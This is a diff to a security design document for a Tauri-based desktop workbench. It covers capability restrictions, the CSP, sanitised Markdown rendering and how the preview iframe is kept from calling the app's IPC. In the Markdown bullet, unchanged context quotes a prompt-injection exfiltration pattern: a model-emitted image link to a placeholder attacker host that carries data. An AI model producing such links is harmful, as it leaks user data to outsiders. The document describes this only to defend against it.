@@ -205,7 +205,7 @@ Built from an allowlist (ADR-0011). Provider keys and Jesutobits internals are n
 
 ## 8. Workbench hardening
 
-- **Tauri capabilities:** the main window gets only Jesutobits' own commands (`rpc_call`, `pty_*`, `settings_*`, `secrets_set`, `secrets_delete`, `secrets_exists`, `extensions_*`, `dialog_pick_folder`, `app_*`) plus core window and event permissions. No `shell`, `fs` or `http` plugin access from the webview (NFR-008). No remote origins in any capability (RN-05, RN-06).
+- **Tauri capabilities:** the main window gets only Jesutobits' own commands (`rpc_call`, `pty_*`, `settings_*`, `secrets_set`, `secrets_delete`, `secrets_exists`, `extensions_*`, `dialog_pick_folder`, `app_*`) plus core window and event permissions. No `shell`, `fs` or `http` plugin access from the webview (NFR-008). No remote origins in any capability (RN-05, RN-06, RN-37). This rule is **load-bearing**: Tauri injects its IPC into the preview iframe, and capability URL scoping is what refuses the frame's calls (Spike S3). `capabilities_never_grant_remote_urls` in `apps/desktop/src-tauri/src/lib.rs` fails the build if any capability grants a `remote` URL.
 - **CSP (target):** `default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: jesutobits-ext:; font-src 'self' jesutobits-ext:; connect-src` limited to Tauri's IPC endpoints; `frame-src http://127.0.0.1:* http://localhost:* jesutobits-ext:; worker-src 'self' blob:; object-src 'none'; base-uri 'none'; form-action 'none'`. `wasm-unsafe-eval` is needed by the companion renderer (ADR-0006).
 - **Markdown:** rendered with raw HTML disabled; links shown with their real URL on hover and opened in the external browser after confirmation for non-HTTPS links; **remote images are never loaded** (placeholder with "Load image from example.com?"). This closes the classic exfiltration channel where injected text makes the model emit `![](https://attacker/?data=...)`.
 - **Untrusted text** (file contents, logs, bridge strings, extension READMEs) is rendered as text or through the same sanitised Markdown renderer. No `dangerouslySetInnerHTML` outside the sanitiser module (lint rule).
@@ -217,6 +217,8 @@ Per session, the audit view (FR-160) lists: permission requests with decision, s
 ## 10. Preview isolation (MVP)
 
 See ADR-0010 and VISUAL_EDITING.md section 9. In short: cross-origin iframe on `127.0.0.1`, no IPC for frames, strict origin + nonce + schema on postMessage, bridge cannot trigger writes, external navigations open outside Jesutobits, no permissions-policy features granted to the frame.
+
+"No IPC for frames" is enforced by capabilities, not by the IPC being absent. On Windows the frame does get `window.__TAURI_INTERNALS__` and `window.chrome.webview`. Spike S3 showed every command it tries is refused because the capability allows only local URLs, and the fire-and-forget routes (`no-cors` fetch to `ipc.localhost`, `chrome.webview.postMessage`) have no effect (`docs/spikes/S3.md`). Keep `scripts/spikes/s3-run.mjs` passing when Tauri is upgraded.
 
 ## 11. Extensions (MVP: Stage 1)
 
